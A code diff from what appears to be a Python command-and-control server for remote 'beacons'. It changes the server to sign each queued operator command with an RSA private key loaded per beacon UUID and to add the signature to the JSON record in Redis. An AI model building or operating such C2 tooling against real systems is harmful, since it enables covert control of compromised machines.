@@ -2,6 +2,12 @@ import subprocess
 import redis
 from datetime import datetime, time
 import json
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import hashes
+import sys
+import binascii
 
 # Needs a function to wipe the db and make all active beacons check in again
 
@@ -48,15 +54,20 @@ while True:
             LastInteraction = connector["LastInteraction"]
             whoami = connector["WhoAmI"]
             result = connector["Result"]
-            key = connector["private-key"]
+            inp = bytes(inp, 'utf-8')
+            with open(uuid + ".pem", "rb") as key_file:  # Read in the pem file for the UUID
+                private_key = serialization.load_pem_private_key(key_file.read(), password=None)
+            signature = private_key.sign(inp, padding.PSS(mgf=padding.MGF1(hashes.SHA256()),
+                                                              salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256())
+            signature = binascii.b2a_hex(signature).decode()
             structure = {
                 "WhoAmI": f"{whoami}",
+                "Signature": f"{signature}",
                 "Retrieved": "1",  # Set retrieved to 1 so we know we got results
                 "Command": f"{inp}",
                 "LastInteraction": f"{LastInteraction}",
                 "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
                 "Result": f"{result}",
-                "private-key": f"{key}",
                 "GotIt": "0"
             }
             structure = json.dumps(structure)  # Dump the json
